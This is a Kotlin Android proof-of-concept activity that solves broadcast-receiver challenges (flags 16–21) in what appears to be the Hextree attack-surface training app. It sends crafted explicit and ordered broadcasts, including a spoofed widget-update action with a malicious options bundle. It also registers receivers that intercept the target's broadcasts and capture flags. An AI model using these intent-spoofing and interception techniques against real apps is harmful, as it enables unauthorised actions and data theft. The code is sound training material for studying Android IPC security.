package com.example.hetreepoc

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.util.Log
import android.widget.Button
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat

class BroadcastSolver : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_broadcast_solver)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        val flag16Button: Button = findViewById(R.id.flag16Button)
        flag16Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.receivers.Flag16Receiver"
            )
            intent.putExtra("flag", "give-flag-16")
            sendBroadcast(intent)
        }

        val flag17Button: Button = findViewById(R.id.flag17Button)
        flag17Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.receivers.Flag17Receiver"
            )
            intent.putExtra("flag", "give-flag-17")
            sendOrderedBroadcast(intent, null, object: BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val resultExtras: Bundle = getResultExtras(true)
                    Log.i(BroadcastSolver::class.java.name, "resultCode: $resultCode, resultData: $resultData")
                    Log.i(BroadcastSolver::class.java.name, Utils.dumpBundle(resultExtras))
                    Log.i(BroadcastSolver::class.java.name, Utils.dumpIntent(context, intent)) //same as the one sent
                }
            }, null, RESULT_OK, null, null)
        }

        val flag19Button: Button = findViewById(R.id.flag19Button)
        flag19Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.receivers.Flag19Widget"
            )
            intent.action = "lalala_APPWIDGET_UPDATE_1337"
            val bundle = Bundle()
            bundle.putInt("appWidgetMaxHeight", 0x41414141)
            bundle.putInt("appWidgetMinHeight", 0x13371337)
            intent.putExtra("appWidgetOptions", bundle)
            sendBroadcast(intent)
        }

        registerDynamicBroadcastReceivers()
    }

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    fun registerDynamicBroadcastReceivers() {
        registerReceiver(object: BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val flag = intent!!.getStringExtra("flag")
                Log.i(BroadcastSolver::class.java.name, "flag18: $flag")
                setResult(RESULT_OK, "foobar", Bundle())
            }
        }, IntentFilter("io.hextree.broadcast.FREE_FLAG"))

        registerReceiver(object: BroadcastReceiver() {
            @SuppressLint("UnsafeIntentLaunch")
            override fun onReceive(context: Context?, intent: Intent?) {
                Log.i(BroadcastSolver::class.java.name, "Flag20 interceptor")
                if(intent!!.getBooleanExtra("interceptor", false))
                    return //avoid recursion
                val newintent = Intent()
                newintent.action = "io.hextree.broadcast.GET_FLAG"
//                newintent.flags = intent.flags or Intent.FLAG_DEBUG_LOG_RESOLUTION
                newintent.putExtra("give-flag", true)
                newintent.putExtra("interceptor", true)
                sendBroadcast(newintent)
            }
        }, IntentFilter("io.hextree.broadcast.GET_FLAG"))

        registerReceiver(object: BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val flag = intent!!.getStringExtra("flag")
                Log.i(BroadcastSolver::class.java.name, "Flag21: $flag")
            }
        }, IntentFilter("io.hextree.broadcast.GIVE_FLAG"))

        Log.i(BroadcastSolver::class.java.name, "BroadcastSolver registered all receivers")
    }
}
